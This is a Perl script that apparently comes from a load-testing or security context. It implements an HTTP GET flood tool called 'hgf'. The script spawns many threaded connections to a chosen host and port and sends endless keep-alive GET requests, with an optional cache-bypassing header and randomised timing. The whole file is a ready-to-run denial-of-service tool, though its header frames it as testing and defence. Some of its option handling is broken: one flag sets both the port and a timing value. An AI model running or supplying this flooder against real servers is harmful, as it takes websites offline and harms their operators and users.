#!/usr/bin/perl
#
# hgf stands for Http Get Flood.
# I made this script for the purpose of testing HTTP multiple request in a single connection
# including Cache-Control http options.
#
# Moonchang Chae <mcchae@cqvista.com>
#
# This program is enough to execute for ubuntu linux but depends Time::HiRes for
# other linux. You can just find and install it at the CPAN or commnet it out.
# I hope that it will be helpful to you who want to protect attack.
#

#GetOpt STD module
use strict;
use IO::Socket;
use Getopt::Std;
use Time::HiRes qw( usleep ualarm gettimeofday tv_interval );
use threads;

my(%args);

my($conns)=1;
my($port)=80;
my($ip)="";
my($vervose)=0;
my($mr_loop)=0;
my($url_file)="/index.html";
my($silent)=0;
my($cache_control)=0;
my($conn_sleep)=0;
my($req_sleep)=0;
my($conn_rand)=0;
my($req_rand)=0;

getopts("c:f:hi:l:m:n:p:stv",\%args);
if (defined $args{c}) {
	$conns = $args{c};
}
if (defined $args{f}) {
	$url_file = $args{f};
}
if (defined $args{i}) {
	$ip = $args{i};
}
if (defined $args{l}) {
	$mr_loop = $args{l};
}
if (defined $args{m}) {
	$conn_sleep = $args{m};
}
if (defined $args{n}) {
	$req_sleep = $args{n};
}
if (defined $args{o}) {
	$conn_rand = $args{o};
}
if (defined $args{p}) {
	$req_rand = $args{p};
}
if (defined $args{p}) {
	$port = $args{p};
}
if (defined $args{s}) {
	$silent = 1;
}
if (defined $args{t}) {
	$cache_control = 1;
}
if (defined $args{v}) {
	$vervose = 1;
}

if(!defined $args{i} or !defined $args{p} or defined $args{h}) {
	print "Usage: perl $0 -i <ip_address/host> -p <port> [-f <url_file>] [options]\n";
	print "  Http Get Flooding simulation client program\n";
	print "	options are as follows\n";
	print	"	-c : number of connections (default is 1)\n";
	print "	-f : file path in url (default is /index.html)\n";
	print "	-l : loop for keep-alive multiple request (default is 0, infinite)\n";
	print "	-m : time period (second) of making new connection\n";
	print "	-n : time period (second) of making new request in a loop\n";
	print "	-o : time period (1~second) of making new connection\n";
	print "	-p : time period (1~second) of making new request in a loop\n";
	print "	-s : silent mode which not display percentage processing result\n";
	print "	-t : with 'Cache-Control:+no-store,+must-revalidate' in request header\n";
	print "	-v : vervose mode\n";
	print "\n";
	print "	ex) $0 -i 10.10.10.10 -p 88 -f /cacti/index.php -c 3 -l 2 -v\n";
	print "	ex) $0 -i 10.10.10.10 -p 88 -f /cacti/index.php -c 1000 -l 100 -m 1 -n 3\n";
	exit;
}

my($protocol) = "tcp";
my($request) = "GET $url_file HTTP/1.1\nHost: $ip\nConnection: Keep-Alive\n";
$request .= "Cache-Control:+no-store,+must-revalidate\n" if ($cache_control);
$request .= "\n";

my(@threads);
my($thread);
my($c_i);
for ($c_i = 0; $c_i < $conns; ++$c_i) {

	my($socket) = IO::Socket::INET->new(PeerAddr=>$ip,
                PeerPort=>$port,
                Proto=>$protocol,
                Timeout=>'1');# || die "Can't connect to address!\n";
	$thread = threads->create(\&conn_func, $socket);
	if (!defined($thread)) {
		printf "Cannot create a new [%d]th thread [%d]", $c_i+1;
	}
	else {
		$threads[$#threads+1] = $thread;
	}

	sleep $conn_sleep if ($conn_sleep > 0);
	if($conn_rand > 0) {
		my($conn_rnd)=rand_range(1,$conn_rand);
		sleep $conn_rnd;
	}
}

# main thread must wait for all working threads are done
foreach $thread (@threads) {
	$thread->join();
}

exit 0;

########################################################################
# rand_range
# $randval=rand_range($min,$range);
# ex) $randval=rand_range(100,50); $randval has the integer value 100~150
########################################################################
sub rand_range {
	my($min,$range)=@_;
	 return int(rand($range)) + $min;
}

################################################################################
sub conn_func {
	my($tid) = threads->self->tid;
	my($socket) = shift;
	if (!defined($socket)) {	# check if socket is closed or not
		printf("[%d] failure: Invalid socket for loop %d!\n", $tid, $mr_loop);
		return;
	}

	my($last_p, $cur_p) = (0,0);
	my($is_close) = 0;
	my($i);


	my $t0 = [gettimeofday];

	for ($i=1; $is_close <= 0; ++$i) {
		if ($mr_loop > 0) {
			last if ($i>$mr_loop);
		}

		# percent gaguage
		if (!$silent && $mr_loop > 0) {
			$cur_p = int(($i * 1.0) / $mr_loop * 100.0);
			if (($mr_loop < 10000 && $last_p + 10 <= $cur_p) ||
					($mr_loop >= 10000 && $last_p != $cur_p))
			{
				printf("[%d:%d] %d %% processing...\n", $tid, $i, $cur_p);
				$last_p = $cur_p;
			}
		}

		print $socket $request;
		if ($vervose) {
			printf("[%d:%d] request = %s", $tid, $i, $request);
		}

		my($buf)="";
		while (defined ($buf = <$socket>))
		{
			if ($buf =~ /^Connection:\s*close/) {
				++$is_close;
				printf("[%d:%d]====>closed\n", $tid,$i) if($vervose);
			}
			printf( "[%d:%d]%s" ,$tid,$i, $buf) if($vervose);
			last if ($buf =~ /<\/html>/);
		}

		sleep $req_sleep if ($req_sleep > 0);
		if($req_rand > 0) {
			my($req_rnd)=rand_range(1,$req_rand);
			sleep $req_rnd;
		}
	}

	my $elapsed = tv_interval ( $t0 );

	printf("[%d] done: %5.3f seconds elapsed for loop %d!\n",
		$tid, $elapsed, $mr_loop);
	close($socket) if (defined($socket));
}

